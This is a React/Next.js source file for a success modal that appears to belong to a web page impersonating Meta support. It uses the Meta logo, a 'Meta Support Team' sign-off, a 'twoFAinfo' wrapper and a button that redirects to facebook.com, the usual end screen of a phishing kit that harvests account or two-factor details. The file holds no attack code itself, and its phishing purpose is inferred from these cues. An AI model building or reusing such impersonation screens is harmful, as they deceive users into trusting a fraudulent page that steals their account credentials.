'use client';

import MetaLogo from '@/assets/images/meta-logo-grey.png';
import SuccessImage from '@/assets/images/success-badge.png';
import { tickSrc } from '@/components/icons';
import { type FC } from 'react';

interface SuccessModalProps {
    show: boolean;
    onClose: () => void;
    texts: Record<string, string>;
}

const SuccessModal: FC<SuccessModalProps> = ({ show, onClose, texts }) => {
    if (!show) return null;

    return (
        <>
            <div className='modal-backdrop show' onClick={onClose} aria-hidden='true' />
            <div className='modal form-modal show' id='successModal' style={{ display: 'block' }} tabIndex={-1}>
                <div className='modal-dialog modal-dialog-centered modal-fullscreen-lg-down'>
                    <div className='modal-content'>
                        <div className='modal-body'>
                            <div className='twoFAinfo-wraper'>
                                <h1 className='modal-title'>{texts.successTitle}</h1>
                                <br />
                                <div className='fb-round-wraper'>
                                    <img alt='' src={SuccessImage.src} style={{ width: '100%' }} />
                                </div>
                                <br />
                                <p>
                                    {texts.successMessage1}
                                    <br />
                                    <br />
                                    {texts.successMessage2}{' '}
                                    <img src={tickSrc} width={16} alt='tick' style={{ verticalAlign: 'middle', margin: '0 4px' }} />
                                    <br />
                                    <br />
                                    {texts.successMessage3}
                                    <br />
                                    <br />
                                    {texts.thankYou}
                                    <br />
                                    <br />
                                    {texts.metaSupportTeam}
                                </p>
                            </div>
                            <div className='form-btn-wrapper'>
                                <button className='btn btn-primary' type='button' onClick={() => { window.location.href = 'https://www.facebook.com'; }}>
                                    <span className='button-text'>{texts.metaVerified}</span>
                                </button>
                            </div>
                        </div>
                        <div className='modal-footer border-0' style={{ flexDirection: 'column', textAlign: 'center' }}>
                            <img src={MetaLogo.src} alt='Meta Logo' style={{ height: '20px', marginBottom: '5px' }} />
                            <div className='footer-links' style={{ fontSize: '12px', color: '#000' }}>
                                {texts.aboutHelpMore}
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </>
    );
};

export default SuccessModal;
